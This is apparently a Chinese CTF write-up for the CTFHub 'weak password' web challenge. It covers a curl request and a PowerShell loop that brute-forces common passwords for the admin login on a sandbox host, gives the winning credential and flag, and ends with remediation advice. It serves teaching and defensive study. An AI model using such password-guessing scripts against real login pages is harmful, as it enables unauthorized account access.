CTFHub - Web - 密码口令 - 弱口令

# CTFHub # Web # 密码口令 # 弱口令 # 字典爆破

一、题目信息

  • 题目名称：弱口令
  • 题目方向：Web - 密码口令
  • 题目环境：动态分配的 HTTP 服务地址
  • 题目目标：登录 WriteUp 管理后台并获取 flag。

二、信息收集

访问根路径后，页面是一个名为“CTFHub WriteUp 管理后台”的登录表单，请求方式为 POST，包含两个关键参数：

name=用户名
password=密码

输入错误凭据后，页面会返回固定提示：

user or password is wrong

该提示可以作为爆破失败的判断条件。登录成功时，响应中的错误提示会消失，并直接显示 flag。

三、弱口令测试

根据后台常见用户名优先测试 admin，再使用常见弱口令字典测试密码。可以直接使用 cURL 验证单个凭据：

curl.exe -i -X POST ^
  --data-urlencode "name=admin" ^
  --data-urlencode "password=admin123" ^
  "http://challenge-xxx.sandbox.ctfhub.com:10800/"

也可以使用 PowerShell 遍历常见密码，并检查是否出现 ctfhub{...}：

$url = "http://challenge-xxx.sandbox.ctfhub.com:10800/"
$passwords = @("123456", "password", "admin888", "admin123")

foreach ($password in $passwords) {
    $body = curl.exe -sS -X POST `
      --data-urlencode "name=admin" `
      --data-urlencode "password=$password" $url | Out-String

    if ($body -match "ctfhub\{[0-9a-f]+\}") {
        Write-Output "username=admin password=$password"
        $Matches[0]
        break
    }
}

四、获取 Flag

本次环境中命中凭据：

username: admin
password: admin123

使用该凭据登录后，页面成功返回 flag：

ctfhub{7c654caa80b4c25bdfdd46dd}
不同动态实例的弱口令可能发生变化。应先确认失败响应特征，再使用常见用户名和弱口令字典测试，避免把正常响应长度变化误判为登录成功。

五、修复建议

  • 禁止使用 admin、123456、admin123 等常见弱口令。
  • 使用 Argon2、bcrypt 等适合密码存储的算法，不要明文或简单哈希保存密码。
  • 增加登录失败次数限制、验证码、账户锁定或渐进式延迟。
  • 管理后台启用多因素认证，并限制来源 IP。
  • 登录失败时返回统一提示，避免泄露用户名是否存在。

六、解题总结

本题的关键是识别标准登录接口，并利用固定错误提示判断登录结果。目标未设置验证码和失败锁定，使用常见用户名与弱口令即可获得后台权限。
